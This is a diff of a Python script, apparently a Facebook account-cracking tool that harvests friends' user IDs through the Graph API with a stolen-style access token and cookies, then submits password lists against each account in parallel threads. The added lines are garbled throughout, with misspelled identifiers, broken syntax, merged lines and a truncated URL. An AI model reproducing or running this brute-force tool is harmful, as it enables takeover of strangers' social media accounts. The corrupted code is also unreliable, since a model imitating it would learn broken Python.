@@ -11,7 +11,7 @@ try:
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
-        os.system('pip install requests futures==2 > /dev/null')
+        os.system('pip install reqllutures==2 > /dev/null')
         os.system('python NOUMAN.py')
 except:pass
         
@@ -24,19 +24,19 @@ for xd in range(10000):
         c=f' TL-tl; {str(gt)}'
         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                                 col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-                        for mi in col['friends']['data']:
+                        for mi in col['friends']'data']:
                                 try:
-                                        iso = (mi['id']+'|'+mi['name'])
-                                        if iso in id:pass
-                                        else:id.append(iso)
-                                except:continue
-                except (KeyError,IOError):
+                                       iso = (mi['id']+'|'+mi['name'])
+                                       if iso in ipass
+                                       else:id.apend(is)
+                             except:continue
+              excpt (KeyEror,IOEror):
                         pass
-                except requests.exceptions.ConnectionError:
-                        exit(f' No internet connection')
+              except requests.xceptions.ConnectionError:
+                       exit(f' No intenet connection')
         try:
-                plist = []
-                try:
+               plist = []
+               try:
                         ps_limit = int(input(' How many passwords do you want to add ? '))
                 except:
                         ps_limit =1
@@ -49,24 +49,23 @@ for xd in range(10000):
                         clear()
                         total_ids = str(len(id))
                         print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for sped up\033[1;37m")
                         linex()
-                        for user in id:
+                       for user in id:
                                 ids,names = user.split('|')
-                                passlist = plist
-                                if mthd in ['1','01']:
-                                        crack_submit.submit(ffb,ids,names,passlist)
-                                elif mthd in ['2','02']:
-                                        crack_submit.submit(api,ids,names,passlist)
+                               passlist = plist
+                               if mthd in ['1','01']:
+                                       crack_submit.submit(ffb,ids,names,passlist)                                elif mthd in ['2','02']:
+                                       crack_submit.submit(api,ds,names,passlist)
                                 else:
-                                        crack_submit.submit(api1,ids,names,passlist)
+                                       crack_submit.submit(api1ids,names,passlist)
                 print('\033[1;37m')
+               linex()
+                print(' The process has cmpleted')
+                print(' Total OK/CP: '+str(len(oks)+'/'+str(len(cps)))
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-                linex()
-                input(' Press enter to back ')
-                os.system('python NOUMAN.py')
+               input(' Press enter to back ')
+                os.system('pyhon NOUMAN.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -166,7 +165,7 @@ def menu():
                         elif xd in ['7','07']:
                                 os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/NOUMAN_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://www.facebook.com/profile.php?id=100087002213579posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                                os.system('xdg-open htprofile.php?id=100087002213579posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -175,7 +174,16 @@ def menu():
                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
                         clear()
                         print('\033[1;31m First Read Note : ')
-                        print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
+                        print("\033[1;36m We Not Responsible if 
+                        
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+                              ok\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
                         linex()
                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
                         print(f" \033[1;37mYour Key : {fkeyx}")
